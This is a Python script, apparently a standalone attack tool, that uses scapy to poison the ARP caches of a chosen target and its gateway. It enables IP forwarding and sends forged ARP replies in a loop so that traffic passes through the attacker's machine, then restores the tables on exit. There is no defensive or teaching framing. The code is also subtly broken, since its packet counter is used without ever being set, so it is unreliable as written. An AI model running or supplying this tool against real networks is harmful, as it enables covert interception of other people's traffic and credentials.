import scapy.all as scapy
import time
import os
import sys
import optparse

# Create an OptionParser object to handle command-line arguments
p = optparse.OptionParser()
p.add_option("--target", dest="target_ip", help="Specify the target IP address")
p.add_option("--gateway", dest="gateway_ip", help="Specify the gateway IP address")
(opt, arg) = p.parse_args()

# Enable IP forwarding to allow packet forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Function to get the MAC address of a given IP address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Function to spoof ARP packets
def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP tables
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    # Continuously spoof ARP packets between target and gateway
    while True:
        spoof(opt.target_ip, opt.gateway_ip)
        spoof(opt.gateway_ip, opt.target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent:", sent_packets_count, end="")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C! Restoring ARP tables and exiting...")
    restore(opt.target_ip, opt.gateway_ip)
    restore(opt.gateway_ip, opt.target_ip)
    time.sleep(0.5)
    exit()
